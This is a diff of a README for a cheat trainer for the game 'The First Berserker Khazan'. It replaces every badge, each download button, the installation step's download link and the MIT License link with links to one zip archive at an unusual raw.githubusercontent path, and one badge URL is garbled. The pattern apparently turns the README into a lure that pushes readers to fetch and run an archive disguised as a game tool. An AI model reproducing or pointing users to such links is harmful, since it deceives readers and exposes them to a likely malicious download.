@@ -1,12 +1,12 @@
 # The First Berserker Khazan Trainer
 
-![Berserker Banner](https://img.shields.io/badge/The%20First%20Berserker%20Khazan-Official%20Trainer-orange.svg)
-![OpenAI API](https://img.shields.io/badge/OpenAI-API-10A37F?logo=openai&logoColor=white) 
-![Claude API](https://img.shields.io/badge/Claude-API-ffbb00?logo=anthropic&logoColor=white)
-![Languages](https://img.shields.io/badge/lang-multilingual-blueviolet)
-![MIT License](https://img.shields.io/badge/License-MIT-green.svg)
+![Berserker Banner](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip%20First%20Berserker%20Khazan-Official%https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
+![OpenAI API](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip) 
+![Claude API](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
+![Languages](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
+![MIT License](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?logo=cloud-download-alt&logoColor=white&style=for-the-badge)](https://Luizgugss.github.io)
+[![Download](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Enjoy seamless performance across a host of battlefields. Whether you wield Wind
 ## 🚀 Installation Guide
 
 1. **Leap into your quest—Download The First Berserker Khazan Trainer:**
-    - [Download Now!](https://img.shields.io/badge/Download-Now-blue?logo=cloud-download-alt&logoColor=white&style=for-the-badge) (https://Luizgugss.github.io)
+    - [Download Now!](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip) (https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
 2. **Unpack your toolkit:**
     - Extract the contents of the archive to a secure folder on your device.
 3. **Activation (The Ritual):**
@@ -128,13 +128,13 @@ While this toolkit crafts immense advantage, it does so under our unique philoso
 
 ## 📜 MIT License (2025)
 
-Licensed under the [MIT License (2025)](https://opensource.org/licenses/MIT).
+Licensed under the [MIT License (2025)](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip).
 
 _Your epic journey is yours to build, adapt, and share. Honor the code, pass the torch, and always leave the world of adventure better than you found it._
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?logo=cloud-download-alt&logoColor=white&style=for-the-badge)](https://Luizgugss.github.io)
+[![Download](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
 
 ---
 
